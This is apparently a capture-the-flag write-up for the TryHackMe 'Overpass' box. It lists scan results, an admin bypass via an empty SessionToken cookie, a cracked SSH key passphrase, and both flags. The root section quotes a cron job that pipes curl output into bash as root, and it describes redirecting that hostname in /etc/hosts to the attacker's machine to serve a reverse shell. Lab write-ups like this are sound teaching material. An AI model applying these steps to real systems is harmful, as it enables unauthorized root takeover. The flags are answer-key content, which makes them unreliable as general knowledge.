# Overpass	
- IP: 10.10.51.99

## Open Ports/Services
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Directories
```
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
```

## Get private key on `/admin`
- `Cookies.set("SessionToken", "")`

## Get user acces
- Username: `james` + private key
  - private key pw: `james13`

## User flag
- `thm{65c1aaf000506e56996822c6281e6bf7}`

## Root flag
- Cron job, change target ip, serve rev shell
- `cat /etc/crontab`
  - `* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`
- `cat /etc/hosts`
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.18.8.184 overpass.thm # changed to my ip to serve malicious script
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
- start up webserver to serve rev shell + listen on nc
- `thm{7f336f8c359dbac18d54fdd64ea753bb}`

SOLVED

